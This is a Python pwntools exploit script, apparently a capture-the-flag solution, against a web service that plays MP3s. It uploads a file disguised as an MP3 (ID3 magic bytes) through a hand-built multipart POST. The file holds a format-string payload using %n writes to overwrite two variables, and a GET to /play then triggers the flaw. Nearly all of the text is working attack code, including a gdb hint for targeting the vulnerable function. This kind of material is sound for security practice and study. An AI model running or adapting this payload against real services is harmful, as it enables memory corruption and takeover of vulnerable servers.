#!/usr/bin/env python3

from pwn import *

e = ELF("./main_patched")
libc = ELF('./glibc/libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r

def upload(payload):
    r = conn()

    target_path = '/upload'

    filename = b"test.mp3"
    boundary = b"---------------------------133713371337"

    # 2. Construct the Multipart Form-Data body
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="' + filename + b'"\r\n'
        b'Content-Type: audio/mpeg\r\n\r\n' +
        payload + b"\r\n"
        b"--" + boundary + b"--\r\n"
    )

    # 3. Construct HTTP Headers
    headers = (
        b"POST " + target_path.encode() + b" HTTP/1.1\r\n"
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
    )


    info(f"Uploading ({len(payload)} bytes)...")
    r.send(headers + body)

    response = r.clean(timeout=2)
    info(f"Response status code:\n{response.decode(errors='ignore').split('\n')[0]}")

    r.close()


def play():
    r = conn()

    path = "/play"

    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"User-Agent: pwntools\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode('utf-8')

    r.send(request)

    # For debugging only.
    # pause()
    response = r.clean(timeout=5)
    info(response.decode('latin-1'))

    r.close()


def main():
    # To debug the newly brought-up main() process, run the following command in a container:
    # `gdb -p 8 -ex "set follow-fork-mode child" -ex "catch exec" -ex "continue" -ex "set breakpoint pending on" -ex "b *(is_mp3+331)"`

    payload = b'\x49\x44\x33'   # Magic numbers
    # Via debugging, the 12th parameter has the pointer to the `0xdead1337` variable, and the 13th parameter has the pointer to the `0x1337beef`.
    payload += b'%48879d%12$n%495d%13$n'
    upload(payload)
    play()

if __name__ == "__main__":
    main()
